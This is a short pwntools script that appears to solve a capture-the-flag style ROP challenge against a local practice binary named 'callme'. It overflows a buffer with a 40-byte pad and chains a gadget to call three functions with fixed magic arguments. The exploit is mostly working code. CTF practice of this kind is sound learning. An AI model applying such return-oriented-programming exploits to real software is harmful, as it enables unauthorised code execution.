# import pwntools
from pwn import *

# setup split context
context.terminal = ['tmux', 'splitw', '-h']

# initiate the process
io = process('./callme')

# attach gdb, and break at 'main'
gdb.attach(io, '''
break main
''')

# cyclic for finding offset
cyclic = cyclic(100)

# setup the pad and exploit
pad = b'a'*40
exploit = pad

# compile the components we need for the chain
g_load_args = p64(0x40093c) # pop rdi; pop rsi; pop rdx; ret, ie usefulgadget
f_callme_one = p64(0x00400720)
f_callme_two = p64(0x00400740)
f_callme_three = p64(0x004006f0)

for f in [f_callme_one, f_callme_two, f_callme_three]:
    exploit += g_load_args
    exploit += p64(0xdeadbeef) # these were wrong in the instructions
    exploit += p64(0xcafebabe)
    exploit += p64(0xd00df00d)
    exploit += f

# exploit some stuff
io.sendafter(b'> ', exploit)

# ensure we hold the window open
io.interactive()
